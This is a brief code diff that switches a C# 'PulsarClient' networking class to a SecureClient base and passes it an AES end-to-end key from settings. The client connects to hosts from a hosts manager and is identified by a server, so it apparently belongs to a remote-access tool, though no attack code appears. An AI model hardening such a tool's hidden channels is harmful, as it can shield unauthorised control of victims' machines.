@@ -18,7 +18,7 @@ using Pulsar.Client.Utilities;
 
 namespace Pulsar.Client.Networking
 {
-    public class PulsarClient : Client, IDisposable
+    public class PulsarClient : SecureClient, IDisposable
     {
         /// <summary>
         /// Used to keep track if the client has been identified by the server.
@@ -51,7 +51,7 @@ namespace Pulsar.Client.Networking
         /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
         /// <param name="serverCertificate">The server certificate.</param>
         public PulsarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
-            : base(serverCertificate)
+            : base(serverCertificate, Settings.AESE2EKEY)
         {
             _hosts = hostsManager;
             _random = new SafeRandom();
